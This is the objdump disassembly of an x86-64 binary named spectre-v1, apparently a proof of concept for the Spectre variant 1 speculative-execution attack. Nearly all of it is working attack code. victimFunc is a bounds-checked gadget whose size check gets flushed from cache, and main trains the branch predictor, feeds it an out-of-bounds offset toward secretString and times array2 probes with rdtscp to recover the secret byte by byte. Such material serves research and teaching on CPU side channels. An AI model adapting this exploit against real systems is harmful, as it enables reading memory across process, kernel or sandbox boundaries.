
bin/spectre-v1.x86：     文件格式 elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64 
    1004:	48 83 ec 08          	sub    $0x8,%rsp
    1008:	48 8b 05 d9 2f 00 00 	mov    0x2fd9(%rip),%rax        # 3fe8 <__gmon_start__@Base>
    100f:	48 85 c0             	test   %rax,%rax
    1012:	74 02                	je     1016 <_init+0x16>
    1014:	ff d0                	call   *%rax
    1016:	48 83 c4 08          	add    $0x8,%rsp
    101a:	c3                   	ret    

Disassembly of section .plt:

0000000000001020 <.plt>:
    1020:	ff 35 8a 2f 00 00    	push   0x2f8a(%rip)        # 3fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	f2 ff 25 8b 2f 00 00 	bnd jmp *0x2f8b(%rip)        # 3fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
    102d:	0f 1f 00             	nopl   (%rax)
    1030:	f3 0f 1e fa          	endbr64 
    1034:	68 00 00 00 00       	push   $0x0
    1039:	f2 e9 e1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    103f:	90                   	nop
    1040:	f3 0f 1e fa          	endbr64 
    1044:	68 01 00 00 00       	push   $0x1
    1049:	f2 e9 d1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    104f:	90                   	nop
    1050:	f3 0f 1e fa          	endbr64 
    1054:	68 02 00 00 00       	push   $0x2
    1059:	f2 e9 c1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    105f:	90                   	nop

Disassembly of section .plt.got:

0000000000001060 <__cxa_finalize@plt>:
    1060:	f3 0f 1e fa          	endbr64 
    1064:	f2 ff 25 8d 2f 00 00 	bnd jmp *0x2f8d(%rip)        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    106b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

Disassembly of section .plt.sec:

0000000000001070 <puts@plt>:
    1070:	f3 0f 1e fa          	endbr64 
    1074:	f2 ff 25 45 2f 00 00 	bnd jmp *0x2f45(%rip)        # 3fc0 <puts@GLIBC_2.2.5>
    107b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000001080 <__stack_chk_fail@plt>:
    1080:	f3 0f 1e fa          	endbr64 
    1084:	f2 ff 25 3d 2f 00 00 	bnd jmp *0x2f3d(%rip)        # 3fc8 <__stack_chk_fail@GLIBC_2.4>
    108b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000001090 <printf@plt>:
    1090:	f3 0f 1e fa          	endbr64 
    1094:	f2 ff 25 35 2f 00 00 	bnd jmp *0x2f35(%rip)        # 3fd0 <printf@GLIBC_2.2.5>
    109b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

Disassembly of section .text:

00000000000010a0 <_start>:
    10a0:	f3 0f 1e fa          	endbr64 
    10a4:	31 ed                	xor    %ebp,%ebp
    10a6:	49 89 d1             	mov    %rdx,%r9
    10a9:	5e                   	pop    %rsi
    10aa:	48 89 e2             	mov    %rsp,%rdx
    10ad:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    10b1:	50                   	push   %rax
    10b2:	54                   	push   %rsp
    10b3:	45 31 c0             	xor    %r8d,%r8d
    10b6:	31 c9                	xor    %ecx,%ecx
    10b8:	48 8d 3d 47 02 00 00 	lea    0x247(%rip),%rdi        # 1306 <main>
    10bf:	ff 15 13 2f 00 00    	call   *0x2f13(%rip)        # 3fd8 <__libc_start_main@GLIBC_2.34>
    10c5:	f4                   	hlt    
    10c6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    10cd:	00 00 00 

00000000000010d0 <deregister_tm_clones>:
    10d0:	48 8d 3d 11 30 00 00 	lea    0x3011(%rip),%rdi        # 40e8 <__TMC_END__>
    10d7:	48 8d 05 0a 30 00 00 	lea    0x300a(%rip),%rax        # 40e8 <__TMC_END__>
    10de:	48 39 f8             	cmp    %rdi,%rax
    10e1:	74 15                	je     10f8 <deregister_tm_clones+0x28>
    10e3:	48 8b 05 f6 2e 00 00 	mov    0x2ef6(%rip),%rax        # 3fe0 <_ITM_deregisterTMCloneTable@Base>
    10ea:	48 85 c0             	test   %rax,%rax
    10ed:	74 09                	je     10f8 <deregister_tm_clones+0x28>
    10ef:	ff e0                	jmp    *%rax
    10f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    10f8:	c3                   	ret    
    10f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001100 <register_tm_clones>:
    1100:	48 8d 3d e1 2f 00 00 	lea    0x2fe1(%rip),%rdi        # 40e8 <__TMC_END__>
    1107:	48 8d 35 da 2f 00 00 	lea    0x2fda(%rip),%rsi        # 40e8 <__TMC_END__>
    110e:	48 29 fe             	sub    %rdi,%rsi
    1111:	48 89 f0             	mov    %rsi,%rax
    1114:	48 c1 ee 3f          	shr    $0x3f,%rsi
    1118:	48 c1 f8 03          	sar    $0x3,%rax
    111c:	48 01 c6             	add    %rax,%rsi
    111f:	48 d1 fe             	sar    %rsi
    1122:	74 14                	je     1138 <register_tm_clones+0x38>
    1124:	48 8b 05 c5 2e 00 00 	mov    0x2ec5(%rip),%rax        # 3ff0 <_ITM_registerTMCloneTable@Base>
    112b:	48 85 c0             	test   %rax,%rax
    112e:	74 08                	je     1138 <register_tm_clones+0x38>
    1130:	ff e0                	jmp    *%rax
    1132:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    1138:	c3                   	ret    
    1139:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001140 <__do_global_dtors_aux>:
    1140:	f3 0f 1e fa          	endbr64 
    1144:	80 3d b5 2f 00 00 00 	cmpb   $0x0,0x2fb5(%rip)        # 4100 <completed.0>
    114b:	75 2b                	jne    1178 <__do_global_dtors_aux+0x38>
    114d:	55                   	push   %rbp
    114e:	48 83 3d a2 2e 00 00 	cmpq   $0x0,0x2ea2(%rip)        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    1155:	00 
    1156:	48 89 e5             	mov    %rsp,%rbp
    1159:	74 0c                	je     1167 <__do_global_dtors_aux+0x27>
    115b:	48 8b 3d a6 2e 00 00 	mov    0x2ea6(%rip),%rdi        # 4008 <__dso_handle>
    1162:	e8 f9 fe ff ff       	call   1060 <__cxa_finalize@plt>
    1167:	e8 64 ff ff ff       	call   10d0 <deregister_tm_clones>
    116c:	c6 05 8d 2f 00 00 01 	movb   $0x1,0x2f8d(%rip)        # 4100 <completed.0>
    1173:	5d                   	pop    %rbp
    1174:	c3                   	ret    
    1175:	0f 1f 00             	nopl   (%rax)
    1178:	c3                   	ret    
    1179:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001180 <frame_dummy>:
    1180:	f3 0f 1e fa          	endbr64 
    1184:	e9 77 ff ff ff       	jmp    1100 <register_tm_clones>

0000000000001189 <topTwoIdx>:
    1189:	f3 0f 1e fa          	endbr64 
    118d:	55                   	push   %rbp
    118e:	48 89 e5             	mov    %rsp,%rbp
    1191:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1195:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    1199:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
    119d:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
    11a1:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    11a5:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    11ac:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    11b0:	48 83 c0 08          	add    $0x8,%rax
    11b4:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    11bb:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    11c2:	00 
    11c3:	e9 ca 00 00 00       	jmp    1292 <topTwoIdx+0x109>
    11c8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    11cc:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    11d3:	00 
    11d4:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    11d8:	48 01 d0             	add    %rdx,%rax
    11db:	48 8b 10             	mov    (%rax),%rdx
    11de:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    11e2:	48 8b 00             	mov    (%rax),%rax
    11e5:	48 39 c2             	cmp    %rax,%rdx
    11e8:	76 4e                	jbe    1238 <topTwoIdx+0xaf>
    11ea:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    11ee:	48 8d 50 08          	lea    0x8(%rax),%rdx
    11f2:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    11f6:	48 8b 00             	mov    (%rax),%rax
    11f9:	48 89 02             	mov    %rax,(%rdx)
    11fc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1200:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1207:	00 
    1208:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    120c:	48 01 d0             	add    %rdx,%rax
    120f:	48 8b 10             	mov    (%rax),%rdx
    1212:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1216:	48 89 10             	mov    %rdx,(%rax)
    1219:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    121d:	48 8d 50 01          	lea    0x1(%rax),%rdx
    1221:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1225:	0f b6 00             	movzbl (%rax),%eax
    1228:	88 02                	mov    %al,(%rdx)
    122a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    122e:	89 c2                	mov    %eax,%edx
    1230:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1234:	88 10                	mov    %dl,(%rax)
    1236:	eb 55                	jmp    128d <topTwoIdx+0x104>
    1238:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    123c:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1243:	00 
    1244:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1248:	48 01 d0             	add    %rdx,%rax
    124b:	48 8b 10             	mov    (%rax),%rdx
    124e:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1252:	48 83 c0 08          	add    $0x8,%rax
    1256:	48 8b 00             	mov    (%rax),%rax
    1259:	48 39 c2             	cmp    %rax,%rdx
    125c:	76 2f                	jbe    128d <topTwoIdx+0x104>
    125e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1262:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1269:	00 
    126a:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    126e:	48 01 d0             	add    %rdx,%rax
    1271:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    1275:	48 83 c2 08          	add    $0x8,%rdx
    1279:	48 8b 00             	mov    (%rax),%rax
    127c:	48 89 02             	mov    %rax,(%rdx)
    127f:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    1283:	48 83 c0 01          	add    $0x1,%rax
    1287:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    128b:	88 10                	mov    %dl,(%rax)
    128d:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
    1292:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1296:	48 3b 45 e0          	cmp    -0x20(%rbp),%rax
    129a:	0f 82 28 ff ff ff    	jb     11c8 <topTwoIdx+0x3f>
    12a0:	90                   	nop
    12a1:	90                   	nop
    12a2:	5d                   	pop    %rbp
    12a3:	c3                   	ret    

00000000000012a4 <victimFunc>:
    12a4:	f3 0f 1e fa          	endbr64 
    12a8:	55                   	push   %rbp
    12a9:	48 89 e5             	mov    %rsp,%rbp
    12ac:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    12b0:	48 8d 05 69 2d 00 00 	lea    0x2d69(%rip),%rax        # 4020 <array1_sz>
    12b7:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    12bb:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    12bf:	0f ae 38             	clflush (%rax)
    12c2:	90                   	nop
    12c3:	48 8b 05 56 2d 00 00 	mov    0x2d56(%rip),%rax        # 4020 <array1_sz>
    12ca:	48 39 45 e8          	cmp    %rax,-0x18(%rbp)
    12ce:	73 33                	jae    1303 <victimFunc+0x5f>
    12d0:	48 8d 15 69 2d 00 00 	lea    0x2d69(%rip),%rdx        # 4040 <array1>
    12d7:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    12db:	48 01 d0             	add    %rdx,%rax
    12de:	0f b6 00             	movzbl (%rax),%eax
    12e1:	0f b6 c0             	movzbl %al,%eax
    12e4:	c1 e0 06             	shl    $0x6,%eax
    12e7:	48 98                	cltq   
    12e9:	48 8d 15 b0 2e 00 00 	lea    0x2eb0(%rip),%rdx        # 41a0 <array2>
    12f0:	0f b6 14 10          	movzbl (%rax,%rdx,1),%edx
    12f4:	0f b6 05 a5 6e 00 00 	movzbl 0x6ea5(%rip),%eax        # 81a0 <temp>
    12fb:	21 d0                	and    %edx,%eax
    12fd:	88 05 9d 6e 00 00    	mov    %al,0x6e9d(%rip)        # 81a0 <temp>
    1303:	90                   	nop
    1304:	5d                   	pop    %rbp
    1305:	c3                   	ret    

0000000000001306 <main>:
    1306:	f3 0f 1e fa          	endbr64 
    130a:	55                   	push   %rbp
    130b:	48 89 e5             	mov    %rsp,%rbp
    130e:	41 54                	push   %r12
    1310:	53                   	push   %rbx
    1311:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
    1318:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    131f:	00 00 
    1321:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    1325:	31 c0                	xor    %eax,%eax
    1327:	48 8b 05 b2 2d 00 00 	mov    0x2db2(%rip),%rax        # 40e0 <secretString>
    132e:	48 8d 15 0b 2d 00 00 	lea    0x2d0b(%rip),%rdx        # 4040 <array1>
    1335:	48 29 d0             	sub    %rdx,%rax
    1338:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
    133f:	c6 85 57 ff ff ff 00 	movb   $0x0,-0xa9(%rbp)
    1346:	48 8d 05 d3 0c 00 00 	lea    0xcd3(%rip),%rax        # 2020 <_IO_stdin_used+0x20>
    134d:	48 89 c7             	mov    %rax,%rdi
    1350:	e8 1b fd ff ff       	call   1070 <puts@plt>
    1355:	48 8b 05 84 2d 00 00 	mov    0x2d84(%rip),%rax        # 40e0 <secretString>
    135c:	48 89 c6             	mov    %rax,%rsi
    135f:	48 8d 05 f6 0c 00 00 	lea    0xcf6(%rip),%rax        # 205c <_IO_stdin_used+0x5c>
    1366:	48 89 c7             	mov    %rax,%rdi
    1369:	b8 00 00 00 00       	mov    $0x0,%eax
    136e:	e8 1d fd ff ff       	call   1090 <printf@plt>
    1373:	48 c7 85 68 ff ff ff 	movq   $0x0,-0x98(%rbp)
    137a:	00 00 00 00 
    137e:	e9 95 03 00 00       	jmp    1718 <main+0x412>
    1383:	48 c7 85 70 ff ff ff 	movq   $0x0,-0x90(%rbp)
    138a:	00 00 00 00 
    138e:	eb 26                	jmp    13b6 <main+0xb0>
    1390:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
    1397:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    139e:	00 
    139f:	48 8d 05 1a 6e 00 00 	lea    0x6e1a(%rip),%rax        # 81c0 <results.0>
    13a6:	48 c7 04 02 00 00 00 	movq   $0x0,(%rdx,%rax,1)
    13ad:	00 
    13ae:	48 83 85 70 ff ff ff 	addq   $0x1,-0x90(%rbp)
    13b5:	01 
    13b6:	48 81 bd 70 ff ff ff 	cmpq   $0xff,-0x90(%rbp)
    13bd:	ff 00 00 00 
    13c1:	76 cd                	jbe    1390 <main+0x8a>
    13c3:	c7 85 58 ff ff ff 00 	movl   $0x0,-0xa8(%rbp)
    13ca:	00 00 00 
    13cd:	48 c7 85 78 ff ff ff 	movq   $0x0,-0x88(%rbp)
    13d4:	00 00 00 00 
    13d8:	e9 b1 01 00 00       	jmp    158e <main+0x288>
    13dd:	c7 85 5c ff ff ff 00 	movl   $0x0,-0xa4(%rbp)
    13e4:	00 00 00 
    13e7:	eb 28                	jmp    1411 <main+0x10b>
    13e9:	8b 85 5c ff ff ff    	mov    -0xa4(%rbp),%eax
    13ef:	c1 e0 06             	shl    $0x6,%eax
    13f2:	48 98                	cltq   
    13f4:	48 8d 15 a5 2d 00 00 	lea    0x2da5(%rip),%rdx        # 41a0 <array2>
    13fb:	48 01 d0             	add    %rdx,%rax
    13fe:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
    1402:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
    1406:	0f ae 38             	clflush (%rax)
    1409:	90                   	nop
    140a:	83 85 5c ff ff ff 01 	addl   $0x1,-0xa4(%rbp)
    1411:	81 bd 5c ff ff ff ff 	cmpl   $0xff,-0xa4(%rbp)
    1418:	00 00 00 
    141b:	7e cc                	jle    13e9 <main+0xe3>
    141d:	48 c7 45 80 ff 03 00 	movq   $0x3ff,-0x80(%rbp)
    1424:	00 
    1425:	e9 85 00 00 00       	jmp    14af <main+0x1a9>
    142a:	48 8b 0d ef 2b 00 00 	mov    0x2bef(%rip),%rcx        # 4020 <array1_sz>
    1431:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
    1438:	ba 00 00 00 00       	mov    $0x0,%edx
    143d:	48 f7 f1             	div    %rcx
    1440:	48 89 55 a8          	mov    %rdx,-0x58(%rbp)
    1444:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1448:	48 99                	cqto   
    144a:	48 c1 ea 36          	shr    $0x36,%rdx
    144e:	48 01 d0             	add    %rdx,%rax
    1451:	25 ff 03 00 00       	and    $0x3ff,%eax
    1456:	48 29 d0             	sub    %rdx,%rax
    1459:	48 83 e8 01          	sub    $0x1,%rax
    145d:	66 b8 00 00          	mov    $0x0,%ax
    1461:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    1465:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    1469:	48 c1 e8 10          	shr    $0x10,%rax
    146d:	48 09 45 b0          	or     %rax,-0x50(%rbp)
    1471:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
    1478:	48 33 45 a8          	xor    -0x58(%rbp),%rax
    147c:	48 23 45 b0          	and    -0x50(%rbp),%rax
    1480:	48 33 45 a8          	xor    -0x58(%rbp),%rax
    1484:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
    1488:	48 c7 45 88 00 00 00 	movq   $0x0,-0x78(%rbp)
    148f:	00 
    1490:	eb 05                	jmp    1497 <main+0x191>
    1492:	48 83 45 88 01       	addq   $0x1,-0x78(%rbp)
    1497:	48 83 7d 88 09       	cmpq   $0x9,-0x78(%rbp)
    149c:	76 f4                	jbe    1492 <main+0x18c>
    149e:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
    14a2:	48 89 c7             	mov    %rax,%rdi
    14a5:	e8 fa fd ff ff       	call   12a4 <victimFunc>
    14aa:	48 83 6d 80 01       	subq   $0x1,-0x80(%rbp)
    14af:	48 83 7d 80 00       	cmpq   $0x0,-0x80(%rbp)
    14b4:	0f 89 70 ff ff ff    	jns    142a <main+0x124>
    14ba:	48 c7 45 90 00 00 00 	movq   $0x0,-0x70(%rbp)
    14c1:	00 
    14c2:	e9 b1 00 00 00       	jmp    1578 <main+0x272>
    14c7:	48 c7 45 98 00 00 00 	movq   $0x0,-0x68(%rbp)
    14ce:	00 
    14cf:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    14d3:	48 c1 e0 06          	shl    $0x6,%rax
    14d7:	48 89 c2             	mov    %rax,%rdx
    14da:	48 8d 05 bf 2c 00 00 	lea    0x2cbf(%rip),%rax        # 41a0 <array2>
    14e1:	48 01 d0             	add    %rdx,%rax
    14e4:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
    14e8:	48 8d 85 58 ff ff ff 	lea    -0xa8(%rbp),%rax
    14ef:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    14f3:	0f 01 f9             	rdtscp 
    14f6:	89 ce                	mov    %ecx,%esi
    14f8:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    14fc:	89 31                	mov    %esi,(%rcx)
    14fe:	48 c1 e2 20          	shl    $0x20,%rdx
    1502:	48 09 d0             	or     %rdx,%rax
    1505:	49 89 c4             	mov    %rax,%r12
    1508:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
    150c:	0f b6 00             	movzbl (%rax),%eax
    150f:	0f b6 c0             	movzbl %al,%eax
    1512:	89 85 58 ff ff ff    	mov    %eax,-0xa8(%rbp)
    1518:	48 8d 85 58 ff ff ff 	lea    -0xa8(%rbp),%rax
    151f:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    1523:	0f 01 f9             	rdtscp 
    1526:	89 ce                	mov    %ecx,%esi
    1528:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
    152c:	89 31                	mov    %esi,(%rcx)
    152e:	48 c1 e2 20          	shl    $0x20,%rdx
    1532:	48 09 d0             	or     %rdx,%rax
    1535:	4c 29 e0             	sub    %r12,%rax
    1538:	48 89 c3             	mov    %rax,%rbx
    153b:	48 83 fb 4e          	cmp    $0x4e,%rbx
    153f:	77 32                	ja     1573 <main+0x26d>
    1541:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    1545:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    154c:	00 
    154d:	48 8d 05 6c 6c 00 00 	lea    0x6c6c(%rip),%rax        # 81c0 <results.0>
    1554:	48 8b 04 02          	mov    (%rdx,%rax,1),%rax
    1558:	48 8d 48 01          	lea    0x1(%rax),%rcx
    155c:	48 8b 45 90          	mov    -0x70(%rbp),%rax
    1560:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1567:	00 
    1568:	48 8d 05 51 6c 00 00 	lea    0x6c51(%rip),%rax        # 81c0 <results.0>
    156f:	48 89 0c 02          	mov    %rcx,(%rdx,%rax,1)
    1573:	48 83 45 90 01       	addq   $0x1,-0x70(%rbp)
    1578:	48 81 7d 90 ff 00 00 	cmpq   $0xff,-0x70(%rbp)
    157f:	00 
    1580:	0f 86 41 ff ff ff    	jbe    14c7 <main+0x1c1>
    1586:	48 83 85 78 ff ff ff 	addq   $0x1,-0x88(%rbp)
    158d:	01 
    158e:	48 83 bd 78 ff ff ff 	cmpq   $0x9,-0x88(%rbp)
    1595:	09 
    1596:	0f 86 41 fe ff ff    	jbe    13dd <main+0xd7>
    159c:	66 c7 45 e6 00 00    	movw   $0x0,-0x1a(%rbp)
    15a2:	48 c7 45 d0 00 00 00 	movq   $0x0,-0x30(%rbp)
    15a9:	00 
    15aa:	48 c7 45 d8 00 00 00 	movq   $0x0,-0x28(%rbp)
    15b1:	00 
    15b2:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
    15b6:	48 8d 45 e6          	lea    -0x1a(%rbp),%rax
    15ba:	48 89 d1             	mov    %rdx,%rcx
    15bd:	48 89 c2             	mov    %rax,%rdx
    15c0:	be 00 01 00 00       	mov    $0x100,%esi
    15c5:	48 8d 05 f4 6b 00 00 	lea    0x6bf4(%rip),%rax        # 81c0 <results.0>
    15cc:	48 89 c7             	mov    %rax,%rdi
    15cf:	e8 b5 fb ff ff       	call   1189 <topTwoIdx>
    15d4:	0f b6 45 e6          	movzbl -0x1a(%rbp),%eax
    15d8:	0f b6 d0             	movzbl %al,%edx
    15db:	48 8b 0d fe 2a 00 00 	mov    0x2afe(%rip),%rcx        # 40e0 <secretString>
    15e2:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
    15e9:	48 01 c8             	add    %rcx,%rax
    15ec:	0f b6 00             	movzbl (%rax),%eax
    15ef:	0f be c0             	movsbl %al,%eax
    15f2:	39 c2                	cmp    %eax,%edx
    15f4:	74 22                	je     1618 <main+0x312>
    15f6:	0f b6 45 e7          	movzbl -0x19(%rbp),%eax
    15fa:	0f b6 d0             	movzbl %al,%edx
    15fd:	48 8b 0d dc 2a 00 00 	mov    0x2adc(%rip),%rcx        # 40e0 <secretString>
    1604:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
    160b:	48 01 c8             	add    %rcx,%rax
    160e:	0f b6 00             	movzbl (%rax),%eax
    1611:	0f be c0             	movsbl %al,%eax
    1614:	39 c2                	cmp    %eax,%edx
    1616:	75 79                	jne    1691 <main+0x38b>
    1618:	0f b6 45 e7          	movzbl -0x19(%rbp),%eax
    161c:	44 0f b6 c0          	movzbl %al,%r8d
    1620:	0f b6 45 e7          	movzbl -0x19(%rbp),%eax
    1624:	0f b6 f8             	movzbl %al,%edi
    1627:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    162b:	0f b6 45 e6          	movzbl -0x1a(%rbp),%eax
    162f:	44 0f b6 c8          	movzbl %al,%r9d
    1633:	0f b6 45 e6          	movzbl -0x1a(%rbp),%eax
    1637:	44 0f b6 d0          	movzbl %al,%r10d
    163b:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    163f:	48 8b 35 9a 2a 00 00 	mov    0x2a9a(%rip),%rsi        # 40e0 <secretString>
    1646:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
    164d:	48 01 f0             	add    %rsi,%rax
    1650:	0f b6 00             	movzbl (%rax),%eax
    1653:	0f be c0             	movsbl %al,%eax
    1656:	4c 8d 1d e3 29 00 00 	lea    0x29e3(%rip),%r11        # 4040 <array1>
    165d:	48 8b b5 60 ff ff ff 	mov    -0xa0(%rbp),%rsi
    1664:	4c 01 de             	add    %r11,%rsi
    1667:	48 83 ec 08          	sub    $0x8,%rsp
    166b:	41 50                	push   %r8
    166d:	57                   	push   %rdi
    166e:	51                   	push   %rcx
    166f:	45 89 d0             	mov    %r10d,%r8d
    1672:	48 89 d1             	mov    %rdx,%rcx
    1675:	89 c2                	mov    %eax,%edx
    1677:	48 8d 05 fa 09 00 00 	lea    0x9fa(%rip),%rax        # 2078 <_IO_stdin_used+0x78>
    167e:	48 89 c7             	mov    %rax,%rdi
    1681:	b8 00 00 00 00       	mov    $0x0,%eax
    1686:	e8 05 fa ff ff       	call   1090 <printf@plt>
    168b:	48 83 c4 20          	add    $0x20,%rsp
    168f:	eb 77                	jmp    1708 <main+0x402>
    1691:	0f b6 45 e7          	movzbl -0x19(%rbp),%eax
    1695:	44 0f b6 c0          	movzbl %al,%r8d
    1699:	0f b6 45 e7          	movzbl -0x19(%rbp),%eax
    169d:	0f b6 f8             	movzbl %al,%edi
    16a0:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    16a4:	0f b6 45 e6          	movzbl -0x1a(%rbp),%eax
    16a8:	44 0f b6 c8          	movzbl %al,%r9d
    16ac:	0f b6 45 e6          	movzbl -0x1a(%rbp),%eax
    16b0:	44 0f b6 d0          	movzbl %al,%r10d
    16b4:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    16b8:	48 8b 35 21 2a 00 00 	mov    0x2a21(%rip),%rsi        # 40e0 <secretString>
    16bf:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
    16c6:	48 01 f0             	add    %rsi,%rax
    16c9:	0f b6 00             	movzbl (%rax),%eax
    16cc:	0f be c0             	movsbl %al,%eax
    16cf:	4c 8d 1d 6a 29 00 00 	lea    0x296a(%rip),%r11        # 4040 <array1>
    16d6:	48 8b b5 60 ff ff ff 	mov    -0xa0(%rbp),%rsi
    16dd:	4c 01 de             	add    %r11,%rsi
    16e0:	48 83 ec 08          	sub    $0x8,%rsp
    16e4:	41 50                	push   %r8
    16e6:	57                   	push   %rdi
    16e7:	51                   	push   %rcx
    16e8:	45 89 d0             	mov    %r10d,%r8d
    16eb:	48 89 d1             	mov    %rdx,%rcx
    16ee:	89 c2                	mov    %eax,%edx
    16f0:	48 8d 05 e1 09 00 00 	lea    0x9e1(%rip),%rax        # 20d8 <_IO_stdin_used+0xd8>
    16f7:	48 89 c7             	mov    %rax,%rdi
    16fa:	b8 00 00 00 00       	mov    $0x0,%eax
    16ff:	e8 8c f9 ff ff       	call   1090 <printf@plt>
    1704:	48 83 c4 20          	add    $0x20,%rsp
    1708:	48 83 85 60 ff ff ff 	addq   $0x1,-0xa0(%rbp)
    170f:	01 
    1710:	48 83 85 68 ff ff ff 	addq   $0x1,-0x98(%rbp)
    1717:	01 
    1718:	48 83 bd 68 ff ff ff 	cmpq   $0x12,-0x98(%rbp)
    171f:	12 
    1720:	0f 86 5d fc ff ff    	jbe    1383 <main+0x7d>
    1726:	b8 00 00 00 00       	mov    $0x0,%eax
    172b:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    172f:	64 48 2b 14 25 28 00 	sub    %fs:0x28,%rdx
    1736:	00 00 
    1738:	74 05                	je     173f <main+0x439>
    173a:	e8 41 f9 ff ff       	call   1080 <__stack_chk_fail@plt>
    173f:	48 8d 65 f0          	lea    -0x10(%rbp),%rsp
    1743:	5b                   	pop    %rbx
    1744:	41 5c                	pop    %r12
    1746:	5d                   	pop    %rbp
    1747:	c3                   	ret    

Disassembly of section .fini:

0000000000001748 <_fini>:
    1748:	f3 0f 1e fa          	endbr64 
    174c:	48 83 ec 08          	sub    $0x8,%rsp
    1750:	48 83 c4 08          	add    $0x8,%rsp
    1754:	c3                   	ret    
